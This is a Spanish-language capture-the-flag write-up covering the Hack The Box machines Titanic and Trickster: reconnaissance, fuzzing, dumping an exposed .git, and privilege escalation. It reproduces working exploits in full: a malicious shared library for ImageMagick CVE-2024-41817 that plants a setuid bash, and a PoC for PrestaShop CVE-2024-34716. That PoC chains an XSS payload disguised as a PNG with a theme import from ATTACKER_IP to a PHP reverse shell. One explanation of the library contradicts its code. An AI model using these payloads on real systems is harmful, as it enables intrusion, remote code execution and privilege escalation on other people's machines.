<br>Este cronjob se utiliza para realizar una verificación programada de los sistemas de archivos ext4 cuando el sistema no está usando systemd . La herramienta e2scrub_all_cron revisa los sistemas de archivos en busca de errores y realiza tareas de mantenimiento.<br><br>Para seguir enumerando vamos a usar <a data-tooltip-position="top" aria-label="https://github.com/DominicBreuker/pspy" rel="noopener nofollow" class="external-link" href="https://github.com/DominicBreuker/pspy" target="_blank">pspy64</a><br>
Es un programa que vigila procesos , archivos que se estan abriendo en el sistema, comandos que se ejecuten...<br>Esto nos ayuda a encontrar un posible corn job de root o algun servicio que ejecute comandos que se nos este escapando en el foothold;<br>Le decimos a pspy que printee tanto comandos como eventos del sistema de archivos a cada segundo<br>developer@titanic:~$ ./pspy64 -cpf -i 1000 | tee pspyrecord
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=true ||| Scanning for processes every 1s and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...

<br>Revisando el log observamos que se esta ejecutando el binario de magick probablemente llamado por un cron job o por el script identify_images.sh<br>
<img alt="Pasted image 20250217200648.png" src="machines/titanic/imgs/pasted-image-20250217200648.png"><br><br>Revisando el script de bash se esta ejecutando magick identify buscando archivos jpg en la ruta /opt/app/static/assets/images/ y guardandolo en un metadata.log<br>developer@titanic:~$ cat /opt/scripts/identify_images.sh
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify &gt;&gt; metadata.log
<br>developer@titanic:~$ find / -type f -name metadata.log 2&gt;/dev/null
/opt/app/static/assets/images/metadata.log

developer@titanic:~$ cat /opt/app/static/assets/images/metadata.log
/opt/app/static/assets/images/luxury-cabins.jpg JPEG 1024x1024 1024x1024+0+0 8-bit sRGB 280817B 0.000u 0:00.003
/opt/app/static/assets/images/entertainment.jpg JPEG 1024x1024 1024x1024+0+0 8-bit sRGB 291864B 0.000u 0:00.000
/opt/app/static/assets/images/home.jpg JPEG 1024x1024 1024x1024+0+0 8-bit sRGB 232842B 0.000u 0:00.000
/opt/app/static/assets/images/exquisite-dining.jpg JPEG 1024x1024 1024x1024+0+0 8-bit sRGB 280854B 0.000u 0:00.000
/opt/app/static/assets/images/root.jpg JPEG 1024x1024 1024x1024+0+0 8-bit sRGB 291864B 0.000u 0:00.000

<br>Miramos la version de magick que es vulnerable al <a data-tooltip-position="top" aria-label="https://nvd.nist.gov/vuln/detail/cve-2024-41817" rel="noopener nofollow" class="external-link" href="https://nvd.nist.gov/vuln/detail/cve-2024-41817" target="_blank">CVE-2024-41817</a><br>
<img alt="Pasted image 20250217203145.png" src="machines/titanic/imgs/pasted-image-20250217203145.png"><br>developer@titanic:~$ magick -version
Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype heic jbig jng jp2 jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (9.4)
<br><br><a rel="noopener nofollow" class="external-link" href="https://github.com/ImageMagick/ImageMagick/issues/7568" target="_blank">https://github.com/ImageMagick/ImageMagick/issues/7568</a><br>
Accrording to Tenable:<br>
ImageMagick is a free and open-source software suite, used for editing and manipulating digital images. The AppImage version ImageMagick might use an empty path when setting MAGICK_CONFIGURE_PATH and LD_LIBRARY_PATH environment variables while executing, which might lead to arbitrary code execution by loading malicious configuration files or shared libraries in the current working directory while executing ImageMagick. The vulnerability is fixed in 7.11-36.<br>This script exploits a vulnerability in ImageMagick’s AppImage version (before 7.1.1-36) that improperly handles LD_LIBRARY_PATH, allowing arbitrary library loading.  <br>Creamos la libreria maliciosa y ejecutamos imagemagick<br>gcc -x c -shared -fPIC -o ./libxcb.so.1 - &lt;&lt; EOF
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;

__attribute__((constructor)) void init(){
    system("sudo install -m =xs $(which bash) /tmp/bash");
    exit(0);
}
EOF
<br><img alt="Pasted image 20250217211424.png" src="machines/titanic/imgs/pasted-image-20250217211424.png"><br>
<img alt="Pasted image 20250217211512.png" src="machines/titanic/imgs/pasted-image-20250217211512.png"><br><br>
<br>
Crea una Biblioteca Compartida Maliciosa (libxcb.so.1)

<br>El código C dentro de ella se ejecuta al cargarse y copia el archivo /root/root.txt a /tmp/root.txt.
<br>Esto se logra utilizando el atributo constructor, que ejecuta automáticamente el comando system("sudo install -m =xs $(which bash) /tmp/bash").


<br>
Prepara un Archivo de Imagen

<br>Copia entertainment.jpg a root.jpg, posiblemente para desencadenar su procesamiento por ImageMagick.


<br><br><br>
<br>La aplicación AppImage de ImageMagick puede cargar incorrectamente libxcb.so.1 desde un directorio controlado por el atacante debido a un manejo inadecuado de la variable de entorno LD_LIBRARY_PATH.
<br>Cuando ImageMagick se ejecuta, carga la biblioteca maliciosa, lo que desencadena la escalada de privilegios.
<br><br><br>
<br>Actualiza ImageMagick a la versión 7.1.1-36 o superior.
<br>Restringir el abuso de variables de entorno (LD_LIBRARY_PATH).
<br>Este enfoque corrige la vulnerabilidad al evitar que se carguen bibliotecas no deseadas y limitando el uso indebido de variables de entorno.]]></description><link>machines/titanic/2.privesc.html</link><guid isPermaLink="false">Machines/Titanic/2.PrivESC.md</guid><pubDate>Mon, 24 Feb 2025 15:44:27 GMT</pubDate><enclosure url="machines/titanic/imgs/fuck.gif" length="0" type="image/gif"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;machines/titanic/imgs/fuck.gif&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[PrivEsc]]></title><description><![CDATA[ 
 <br>viendo que tenemos una interfaz docker vamos a escanear la red en búsqueda de posibles puntos de ataque;<br>Ya que nmap no esta  instalado en la maquina vamos a escanear la maquina con tecnicas lotl (living off the land)<br><a data-tooltip-position="top" aria-label="https://sevenlayers.com/index.php/blog/490-living-off-the-land-scanning" rel="noopener nofollow" class="external-link" href="https://sevenlayers.com/index.php/blog/490-living-off-the-land-scanning" target="_blank">Living  off the land tecniches : nmap</a><br><br>james@trickster:~$ for i in {1..254}; do ping -w 2 -c 1 172.17.0.$i | grep "64 bytes" | cut -d ' ' -f 4 | sed 's/://'; done;

172.17.0.1
172.17.0.2
<br>Vemos que tiene conexion con 2 ips dentro del rango;<br>
la 172.17.0.1 es la del propio host; mientras que la 172.17.0.2 parece de un container; vamos a investigar puertos abiertos<br><br>Escaneamos con nc el rango entero de puertos de la ip 172.17.0.2<br>james@trickster:~$ nc -vnz -w 1 172.17.0.2 1-65535 2&gt;&amp;1 | grep succeeded
Connection to 172.17.0.2 5000 port [tcp/*] succeeded!
<br>Tenemos conexion con el puerto 5000 vamos a hacer pivoting con ssh<br><br>Tenemos algun servicio corriendo en un docker en la ip 172.17.0.2 por el puerto 5000 vamos a hacer un puente con ssh para tener conexion con el puerto aunque podriamos hacer pivoting con chisel ,metaexploit o lingolo-ng;<br>➜  ~ ssh james@trickster.htb -L 5000:172.17.0.2:5000
<br>Podemos escanear el puerto con nmap a ver si encontramos informacion del servicio; ahora que esta establecido el puente la conexion<br>sudo nmap -sCV -p 5000 -v -Pn -n localhost
PORT     STATE SERVICE VERSION                                       
5000/tcp open  http    Python http.server 3.5 - 3.10
| http-title: Change Detection
|_Requested resource was /login?next=/
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
<br>Nos encontramos ante un changedetection.io en la v0.45.20<br>
“Pasted image 20250213201338.png” could not be found.<br>
Vemos ]]></description><link>machines/trickster/imgs/privesc.html</link><guid isPermaLink="false">Machines/Trickster/imgs/PrivEsc.md</guid><pubDate>Fri, 14 Feb 2025 10:35:06 GMT</pubDate></item><item><title><![CDATA[1.Recon]]></title><description><![CDATA[ 
 <br>Nmap TCP port SYN scan<br>sudo nmap -sS -Pn -n --min-rate 5000 -p- trickster.htb -oG nmapsS
[sudo] password for cher0: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-12 10:15 CET
Nmap scan report for trickster.htb (10.10.11.34)
Host is up (0.043s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 11.42 seconds
<br>Nmap TCP CV scan<br>sudo nmap -sCV -Pn -n --min-rate 5000 -p 22,80 trickster.htb -oG nmapsCV 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-12 10:15 CET
Nmap scan report for trickster.htb (10.10.11.34)
Host is up (0.060s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 8c:01:0e:7b:b4:da:b7:2f:bb:2f:d3:a3:8c:a6:6d:87 (ECDSA)
|_  256 90:c6:f3:d8:3f:96:99:94:69:fe:d3:72:cb:fe:6c:c5 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: _; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.41 seconds
<br><br><img alt="Pasted image 20250212101724.png" src="machines/trickster/imgs/pasted-image-20250212101724.png"><br>
El apartado "shop" nos redirecciona a la siguiente url: <a rel="noopener nofollow" class="external-link" href="http://shop.trickster.htb/" target="_blank">http://shop.trickster.htb/</a><br>
la metemos en el /etc/hosts<br>10.10.11.34 trickster.htb shop.trickster.htb
<br><br>Vamos a aplicar Fuzzing;<br><br>feroxbuster -u http://trickster.htb -r -w /usr/share/seclist/Discovery/Web-Content/raft-large-directories-lowercase.txt -C 503
                                                                                                                      
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher                    ver: 2.11.0
───────────────────────────┬──────────────────────
     Target Url            │ http://trickster.htb
     Threads               │ 50
     Wordlist              │ /usr/share/seclist/Discovery/Web-Content/raft-large-directories-lowercase.txt
     Status Code Filters   │ [503]
     Timeout (secs)        │ 7
     User-Agent            │ feroxbuster/2.11.0
     Config File           │ /etc/feroxbuster/ferox-config.toml
     Extract Links         │ true
     HTTP methods          │ [GET]
     Follow Redirects      │ true
     Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        2l       87w     2438c http://trickster.htb/assets/js/breakpoints.min.js
200      GET       37l       80w      568c http://trickster.htb/assets/css/noscript.css
200      GET      587l     1232w    11847c http://trickster.htb/assets/js/util.js
200      GET      401l      738w     8035c http://trickster.htb/assets/js/main.js
200      GET       22l       68w     8886c http://trickster.htb/images/overlay.png
200      GET     1638l     3543w    34125c http://trickster.htb/assets/css/main.css
200      GET        2l     1283w    86927c http://trickster.htb/assets/js/jquery.min.js
503      GET       11l       42w      378c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
503      GET       11l       42w      378c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET     3386l    19800w  1485483c http://trickster.htb/images/pic01.jpg
200      GET     7017l    47787w  3060292c http://trickster.htb/images/pic02.jpg
200      GET     7166l    43779w  3126314c http://trickster.htb/images/pic03.jpg
200      GET      355l      927w    12683c http://trickster.htb/
200      GET    13704l    73264w  5732348c http://trickster.htb/images/bg.jpg
200      GET       20l       94w     1730c http://trickster.htb/images/
<br><br><br>➜  ~ wappalyzer -i http://shop.trickster.htb
http://shop.trickster.htb Apache HTTP Server v2.4.52, Ubuntu, PrestaShop, jQuery v3.5.1, jQuery UI v1.10.3, PHP, Bootstrap, core-js v2.6.12, jQuery Migrate v3.1.0, Cart Functionality, Open Graph
<br>El subdomino usa Prestashop;<br>
PrestaShop es un sistema de gestión de contenidos libre y de código abierto pensado para construir desde cero tiendas en línea de comercio electrónico. Enfocado para permitir crear tiendas en línea desde pequeñas empresas a grandes corporaciones<br><br>feroxbuster -u http://shop.trickster.htb -r -w /usr/share/seclist/Discovery/Web-Content/raft-large-directories-lowercase.txt -C 503 403
                                                                                                                      
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher                    ver: 2.11.0
───────────────────────────┬──────────────────────
     Target Url            │ http://shop.trickster.htb
     Threads               │ 50
     Wordlist              │ /usr/share/seclist/Discovery/Web-Content/raft-large-directories-lowercase.txt
     Status Code Filters   │ [503, 403]
     Timeout (secs)        │ 7
     User-Agent            │ feroxbuster/2.11.0
     Config File           │ /etc/feroxbuster/ferox-config.toml
     Extract Links         │ true
     HTTP methods          │ [GET]
     Follow Redirects      │ true
     Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET     1043l     2429w    44977c http://shop.trickster.htb/password-recovery
404      GET     1006l     2319w    43228c http://shop.trickster.htb/log
200      GET        7l       17w      112c http://shop.trickster.htb/.git/config
200      GET        1l        2w       28c http://shop.trickster.htb/.git/HEAD
200      GET     1423l     2799w    53077c http://shop.trickster.htb/registration
200      GET        1l       10w       73c http://shop.trickster.htb/.git/description
200      GET        1l        3w       20c http://shop.trickster.htb/.git/COMMIT_EDITMSG
200      GET     1071l     2387w    44984c http://shop.trickster.htb/guest-tracking
200      GET        1l       11w      163c http://shop.trickster.htb/.git/logs/HEAD
200      GET        6l       43w      240c http://shop.trickster.htb/.git/info/exclude
200      GET       53l      234w     1374c http://shop.trickster.htb/.git/hooks/pre-push.sample
200      GET       78l      499w     2783c http://shop.trickster.htb/.git/hooks/push-to-checkout.sample
200      GET       42l      238w     1492c http://shop.trickster.htb/.git/hooks/prepare-commit-msg.sample
200      GET        8l       32w      189c http://shop.trickster.htb/.git/hooks/post-update.sample
200      GET       13l       67w      416c http://shop.trickster.htb/.git/hooks/pre-merge-commit.sample
200      GET       24l       83w      544c http://shop.trickster.htb/.git/hooks/pre-receive.sample
200      GET       14l       69w      424c http://shop.trickster.htb/.git/hooks/pre-applypatch.sample
200      GET       49l      279w     1643c http://shop.trickster.htb/.git/hooks/pre-commit.sample
200      GET      174l      675w     4726c http://shop.trickster.htb/.git/hooks/fsmonitor-watchman.sample
200      GET      978l     2780w   316386c http://shop.trickster.htb/.git/index
200      GET      128l      546w     3650c http://shop.trickster.htb/.git/hooks/update.sample
200      GET       15l       79w      478c http://shop.trickster.htb/.git/hooks/applypatch-msg.sample
200      GET       77l      323w     2308c http://shop.trickster.htb/.git/hooks/sendemail-validate.sample
200      GET      169l      798w     4898c http://shop.trickster.htb/.git/hooks/pre-rebase.sample
200      GET       24l      163w      896c http://shop.trickster.htb/.git/hooks/commit-msg.sample
200      GET        1l        1w       41c http://shop.trickster.htb/.git/refs/heads/admin_panel
404      GET     1006l     2319w    43251c http://shop.trickster.htb/upload/
200      GET     1155l     2446w    46526c http://shop.trickster.htb/login
200      GET     1155l     2446w    46636c http://shop.trickster.htb/login?back=my-account
404      GET     1006l     2319w    43294c http://shop.trickster.htb/.git/hooks/.git
200      GET     1102l     2444w    46283c http://shop.trickster.htb/cart?action=show
404      GET     1006l     2319w    43326c http://shop.trickster.htb/.git/refs/heads/.git/
404      GET     1006l     2319w    43350c http://shop.trickster.htb/.git/refs/heads/.git/refs
200      GET     1155l     2446w    46615c http://shop.trickster.htb/login?back=history
200      GET     1051l     2357w    44462c http://shop.trickster.htb/search
404      GET     1006l     2319w    43345c http://shop.trickster.htb/.git/refs/tags/.git/refs
404      GET     1006l     2319w    43325c http://shop.trickster.htb/.git/refs/tags/.git/
200      GET     1155l     2446w    46629c http://shop.trickster.htb/login?back=addresses
404      GET     1006l     2319w    43325c http://shop.trickster.htb/.git/logs/refs/.git/
404      GET     1006l     2319w    43309c http://shop.trickster.htb/.git/branches/.git

<br>Durante el fuzzing encontramos un repositorio /.git accesible;  tratamos de dumpearlo<br><br>Con la herramienta de <a data-tooltip-position="top" aria-label="https://github.com/arthaud/git-dumper" rel="noopener nofollow" class="external-link" href="https://github.com/arthaud/git-dumper" target="_blank">git-dumper</a> dumpeamos todo el directorio de /.git<br> ./git_dumper.py http://shop.trickster.htb/.git/ DUMP
<br>DUMP:<br>
En el directorio encontramos varios archivos, entre ellos un Makefile lo que nos puede dar una pista de que nos enfrentamos a un contenedor de Docker y varios archivos .php lo que nos confirma que el servidor maneja lenguaje php que nos puede ser de ayuda para explotar la maquina<br>(venv) ➜  DUMP git:(admin_panel) ls -ls
total 216
  8 -rw-rw-r-- 1 cher0 cher0   5054 Feb 12 12:16 INSTALL.txt
  4 -rw-rw-r-- 1 cher0 cher0    522 Feb 12 12:16 Install_PrestaShop.html
180 -rw-rw-r-- 1 cher0 cher0 183862 Feb 12 12:16 LICENSES
  4 -rw-rw-r-- 1 cher0 cher0    863 Feb 12 12:16 Makefile
  4 drwxrwxr-x 8 cher0 cher0   4096 Feb 12 12:16 admin634ewutrx1jgitlooaj
  4 -rw-rw-r-- 1 cher0 cher0   1305 Feb 12 12:16 autoload.php
  4 -rw-rw-r-- 1 cher0 cher0   2506 Feb 12 12:16 error500.html
  4 -rw-rw-r-- 1 cher0 cher0   1169 Feb 12 12:16 index.php
  4 -rw-rw-r-- 1 cher0 cher0   1256 Feb 12 12:16 init.php

<br>En el Install.txt vemos que la instalacion se trata de un Pentashop 8 lo que nos puede indicar que el software esta usando su version 8; tambien nos confirma que precisa de PHP v 7.2 o superior y un servidor de datos MySQL.<br><img alt="Pasted image 20250212122216.png" src="machines/trickster/imgs/pasted-image-20250212122216.png"><br>si entramos en el endpoint /admin634ewutrx1jgitlooaj encontramos un admin panel en shop; ademas descubrimos la version de PrestaShop que corre en la 8.1.5<br><img alt="Pasted image 20250213103827.png" src="machines/trickster/imgs/pasted-image-20250213103827.png"><br><br>Esta version de PrestaShop es vulnerable a XSS ; <a data-tooltip-position="top" aria-label="https://github.com/PrestaShop/PrestaShop/security/advisories/GHSA-45vm-3j38-7p78" rel="noopener nofollow" class="external-link" href="https://github.com/PrestaShop/PrestaShop/security/advisories/GHSA-45vm-3j38-7p78" target="_blank">github</a><br>El exploit se puede triggerear en el contact form de la pagina; un atacante puede subir un archivo malicioso que triggerea el XSS cuando lo abre el administrador ;<br>Nos dirigimos al formulario<br>http://shop.trickster.htb/contact-us
<br><img alt="Pasted image 20250213104457.png" src="machines/trickster/imgs/pasted-image-20250213104457.png"><br>Encuentro este <a data-tooltip-position="top" aria-label="https://ayoubmokhtar.com/post/png_driven_chain_xss_to_remote_code_execution_prestashop_8.1.5_cve-2024-34716/" rel="noopener nofollow" class="external-link" href="https://ayoubmokhtar.com/post/png_driven_chain_xss_to_remote_code_execution_prestashop_8.1.5_cve-2024-34716/" target="_blank">documento</a> que detalla la explotacion de la vulnerabilidad <br>Nos bajamos el script automatizado de github y lo analizamos, el documento ya aclara como se explota la vulnerabilidad XSS pero podemos llegar a RCE enviando un .html malicioso disfrazado de imagen png;<br>➜  CVE-2024-34716_PoC git:(main) ls -laF 
total 7320
drwxrwxr-x 3 cher0 cher0    4096 Feb 13 10:51 ./
drwxrwxr-x 5 cher0 cher0    4096 Feb 13 10:51 ../
drwxrwxr-x 8 cher0 cher0    4096 Feb 13 10:51 .git/
-rw-rw-r-- 1 cher0 cher0      47 Feb 13 10:51 .gitignore
-rw-rw-r-- 1 cher0 cher0     346 Feb 13 10:51 README.md
-rw-rw-r-- 1 cher0 cher0    4434 Feb 13 10:51 exploit.html
-rw-rw-r-- 1 cher0 cher0    5100 Feb 13 10:51 exploit.py
-rw-rw-r-- 1 cher0 cher0 7444481 Feb 13 10:51 ps_next_8_theme_malicious_old.zip
-rw-rw-r-- 1 cher0 cher0      32 Feb 13 10:51 requirements.txt
-rw-rw-r-- 1 cher0 cher0    5496 Feb 13 10:51 reverse_shell_template.php

<br>Atached a zip theme file that was used for testing and the same ZIP contains a .htaccess file with the content below, which will enforce and allow access to the directory where we host our reverse_shell.php. It’s basically to allow everyone to view or interact with the contents of the directory without restrictions, because if we didn’t do this, we wouldn’t be able to access our reverse_shell.php that grants us a reverse shell and we would get forbidden instead.<br>&lt;IfModule mod_authz_core.c&gt;
 Require all granted
&lt;/IfModule&gt;
<br><br>Analizamos el siguiente PoC del CVE para conseguir RCE en PrestaShop;<br>import argparse, requests, subprocess, time, threading, atexit, http.server, socketserver,zipfile,shutil,os
from bs4 import BeautifulSoup


print_lock = threading.Lock()
stop_event = threading.Event()

def __parse_args():    
    parser = argparse.ArgumentParser(description="CVE-2024-34716 Exploit")
    parser.add_argument("--url", help="The Presta Shop base url.", required=True)
    parser.add_argument("--email", help="The email address of admin user.", required=True)
    parser.add_argument("--local-ip", help="Local HTTP Server IP.", required=True)
    parser.add_argument("--admin-path", help="The Presta Shop admin path.", required=True) 
    
    args = parser.parse_args()
    
    host_url = args.url
    email = args.email
    local_ip = args.local_ip
    admin_path = args.admin_path

    print("[X] Starting exploit with:")
    print(f"\tUrl: {host_url}")
    print(f"\tEmail: {email}")
    print(f"\tLocal IP: {local_ip}")
    print(f"\tAdmin Path: {admin_path}")
                
    return (host_url, email, local_ip, admin_path)
    
    
def send_get_requests(url, interval=5):
    while not stop_event.is_set():
        try:
            response = requests.get(url)
            if response.status_code == 504 or response.status_code == 200:
                stop_event.set()
                return
            print(f"GET request to {url}: {response.status_code}")
            
        except requests.RequestException as e:
            with print_lock:
                print(f"Error during GET request: {e}") # Can comment this out if thread isn't stopped.
        time.sleep(interval)


def run_http_server():
    PORT = 5000
    with socketserver.TCPServer(("", PORT), CustomRequestHandler) as httpd:
        with print_lock:
            print("Serving at http.Server on port", PORT)
        while not stop_event.is_set():
            httpd.handle_request()
        

def main():    
    host_url, email, local_ip, admin_path = __parse_args()

    with open('./exploit.html', 'r') as file:
        html_content = file.read()

    if host_url[-1] == '/':
        host_url = host_url[:-1]

    html_content = html_content.replace("BASE_URL", f'"{host_url}"')
    html_content = html_content.replace("ATTACKER_IP", f'"{local_ip}"')
    html_content = html_content.replace("ATTACKER_PORT", "5000")
    html_content = html_content.replace("ADMIN_PATH", f'"{admin_path}"')
    html_content = html_content.replace("FILE_NAME", '"ps_next_8_theme_malicious.zip"')

    with open('./reverse_shell_template.php', 'r') as file:
        reverse_shell_content = file.read()
    
    reverse_shell_content = reverse_shell_content.replace("ATTACKER_IP", f'"{local_ip}"')
    reverse_shell_content = reverse_shell_content.replace("ATTACKER_PORT", "12345")

    with open('./reverse_shell.php', 'w') as file:
        file.write(reverse_shell_content)
    
    shutil.copy('ps_next_8_theme_malicious_old.zip', 'ps_next_8_theme_malicious.zip')
    with zipfile.ZipFile('ps_next_8_theme_malicious.zip', 'a') as zipf:
        zipf.write('reverse_shell.php','reverse_shell_new.php')



    url = f"{host_url}/contact-us"

    response = requests.get(url)
    response.raise_for_status()

    soup = BeautifulSoup(response.text, 'html.parser')
    token = soup.find('input', {'name': 'token'})['value']
    cookies = response.cookies

    files = {
        'fileUpload': ('test.png', html_content, 'image/png'),
    }

    data = {
        'id_contact': '2',
        'from': email,
        'message': 'pwned',
        'url': '',
        'token': token,
        'submitMessage': 'Send'
    }

    response = requests.post(url, files=files, data=data, cookies=cookies)
    url = f"{host_url}/themes/next/reverse_shell_new.php"

    req_thread = threading.Thread(target=send_get_requests, args=(url, 15,))
    req_thread.daemon = True
    req_thread.start()
    
    server_thread = threading.Thread(target=run_http_server)
    server_thread.daemon = True
    server_thread.start()

    if response.status_code == 200:
        print(f"[X] Ncat is now listening on port 12345. Press Ctrl+C to terminate.")
        
        output = subprocess.call(["ncat", "-lnvp", "12345"], shell=False)
        if b"Ncat: Connection from " in output:
            with print_lock:
                print("Stopping threads!")
            stop_event.set()
        else:
            print(f"DEBUG:: {output}")
    else:
        print(f"[!] Failed to send the message. Status code: {response.status_code} Reason: {response.reason}")


def clean():
    if os.path.exists('ps_next_8_theme_malicious.zip'):
        os.remove('ps_next_8_theme_malicious.zip')
    if os.path.exists('reverse_shell.php'):
        os.remove('reverse_shell.php')

class CustomRequestHandler(http.server.SimpleHTTPRequestHandler):
    def log_request(self, code='-', size='-'):
        with print_lock:
            print(f"Request: {self.command} {self.path} {self.request_version}")
            print(f"Response: {code} {size}")
        super().log_request(code, size)



if __name__ == "__main__":
    clean()
    atexit.register(clean)
    main()

<br><br>Esta función configura y parsea los argumentos necesarios para ejecutar el exploit:<br>
<br>Argumentos requeridos :

<br>--url: URL base del sitio vulnerable.
<br>--email: Dirección de correo electrónico del administrador.
<br>--local-ip: IP local donde se ejecutará el servidor HTTP y el shell inverso.
<br>--admin-path: Ruta del panel de administración de PrestaShop.


<br>Después de parsear los argumentos, imprime la configuración seleccionada.<br><br>Esta función envía solicitudes GET repetidas a una URL específica hasta que ocurra una condición de detención (stop_event.is_set()).<br>
<br>Si recibe un código de respuesta 504 o 200, detiene las solicitudes.
<br>Utiliza un intervalo entre solicitudes para evitar saturar el servidor.
<br><br>Levanta un servidor HTTP local en el puerto 5000:<br>
<br>Usa CustomRequestHandler como manejador personalizado para registrar las solicitudes entrantes.
<br>El servidor permanece activo hasta que se establezca stop_event.****
<br><br>Esta es la función principal del script, donde ocurre la lógica del exploit:<br><br>
<br>Lee el archivo exploit.html y reemplaza marcadores de posición (BASE_URL, ATTACKER_IP, etc.) con los valores proporcionados por el usuario.

<br>exploit.html:


<br>&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;

&lt;head&gt;
    &lt;meta charset="UTF-8"&gt;
    &lt;meta viewport="width=device-width, initial-scale=1.0"&gt;
    &lt;title&gt;Exploit&lt;/title&gt;
&lt;/head&gt;

&lt;body&gt;
    &lt;script&gt;
        const baseUrl = BASE_URL;
        const path = ADMIN_PATH;
        const httpServerIp = ATTACKER_IP;
        const httpServerPort = ATTACKER_PORT;
        const fileNameOfTheme = FILE_NAME;

        async function fetchTokenFromHTML() {
            const url = `${baseUrl}/${path}/index.php/improve/design/themes/import`;
            try {
                const response = await fetch(url, {
                    method: 'GET',
                    credentials: 'include',
                    redirect: 'follow'
                });
                if (!response.ok) throw new Error('Failed to fetch the page for token extraction. Status: ' + response.status);

                const htmlText = await response.text();
                const parser = new DOMParser();
                const doc = parser.parseFromString(htmlText, "text/html");

                const anchor = doc.querySelector('a.btn.btn-lg.btn-outline-danger.mr-3');
                const href = anchor ? anchor.getAttribute('href') : null;
                const match = href ? href.match(/_token=([^&amp;]+)/) : null;
                const token = match ? match[1] : null;
                if (!token) throw new Error('Token not found in anchor tag href.');

                console.log('Extracted Token from HTML:', token);
                return token;
            } catch (error) {
                console.error('Error fetching token from HTML content:', error);
                return null;
            }
        }

        async function fetchCSRFToken(token) {
            const csrfUrl = `${baseUrl}/${path}/index.php/improve/design/themes/import?_token=${token}`;
            try {
                const response = await fetch(csrfUrl, {
                    method: 'GET',
                    credentials: 'include',
                    redirect: 'follow'
                });
                if (!response.ok) throw new Error('Failed to fetch the page for CSRF token extraction. Status: ' + response.status);

                const htmlText = await response.text();
                const parser = new DOMParser();
                const doc = parser.parseFromString(htmlText, "text/html");

                const csrfTokenInput = doc.querySelector('input[name="import_theme[_token]"]');
                const csrfToken = csrfTokenInput ? csrfTokenInput.value : null;
                if (!csrfToken) throw new Error('CSRF token not found in HTML content.');

                console.log('Extracted CSRF Token:', csrfToken);
                return csrfToken;
            } catch (error) {
                console.error('Error fetching CSRF token:', error);
                return null;
            }
        }

        async function importTheme() {
            try {
                const locationHeaderToken = await fetchTokenFromHTML();
                if (!locationHeaderToken) {
                    console.error('Failed to fetch token from HTML');
                    return;
                }

                const csrfToken = await fetchCSRFToken(locationHeaderToken);
                if (!csrfToken) {
                    console.error('Failed to fetch CSRF token');
                    return;
                }

                const formData = new FormData();
                formData.append('import_theme[import_from_web]', `http://${httpServerIp}:${httpServerPort}/${fileNameOfTheme}`);
                formData.append('import_theme[_token]', csrfToken);

                const postUrl = `/${path}/index.php/improve/design/themes/import?_token=${locationHeaderToken}`;
                console.log('POST URL:', postUrl);

                const response = await fetch(postUrl, {
                    method: 'POST',
                    body: formData,
                });

                if (response.ok) {
                    console.log('Theme imported successfully');
                } else {
                    console.error('Failed to import theme. Response Status:', response.status);
                }
            } catch (error) {
                console.error('Error importing theme:', error);
            }
        }

        document.addEventListener('DOMContentLoaded', function () {
            importTheme();
        });
    &lt;/script&gt;
&lt;/body&gt;

&lt;/html&gt;
<br><br>
